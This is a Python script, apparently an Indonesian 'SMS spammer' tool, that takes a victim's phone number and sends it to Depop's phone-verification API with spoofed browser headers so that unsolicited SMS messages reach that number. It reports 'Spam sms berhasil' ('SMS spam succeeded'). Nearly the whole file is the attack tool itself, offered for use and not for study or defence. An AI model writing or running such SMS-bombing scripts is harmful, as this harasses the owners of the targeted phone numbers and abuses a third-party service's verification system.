import requests,json,os,time
from requests import put

os.system("clear")

print ("""
 ___          ___
/ __| _  __  / __|
\__ \| '   \ \__ \\
|___/|_|_|_| |___/
 ___
/ __|_ __  __ _ _ __  _ __  ___ _ _ ___
\__ \ '_ \/ _` | '  \| '  \/ -_) '_(_-<
|___/ .__/\__,_|_|_|_|_|_|_\___|_| /__/
    |_| FR-Nanda.

 ___________________________________
|				    |
|Author   : FERNANDA      	    |
|Github   : github.com/FR-nanda1605 |
|YOUTUBE  : Am Project		    |
|___________________________________|

""")

nomor=input("nomor: ")
headers={
"Host":"webapi.depop.com",
"content-length":"50",
"accept":"application/json, text/plain, */*",
"user-agent":"Mozilla/5.0 (Linux; Android 6.0.1; SM- G532G) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
"content-type":"application/json",
"origin":"https://signup.depop.com",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://signup.depop.com/",
"accept-encoding":"gzip, deflate, br",
"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
data={
"phone_number":nomor,
"country_code":"ID"
}
respon=requests.put("https://webapi.depop.com/api/auth/v1/verify/phone",headers=headers,json=data)
FR=json.loads(respon.text)
if FR["is_verified"]==False:

    load = '+'
    count = 0
    for t in range(101):
        time.sleep(0.05)
        print(f'\rloading {t}% [{load}]', end='', flush=True)
        count +=1
        if count == 3:
           count = 0
           load = '+'

    print("  ")
    print("Spam sms berhasil")
else:
    print("spam sms gagal")
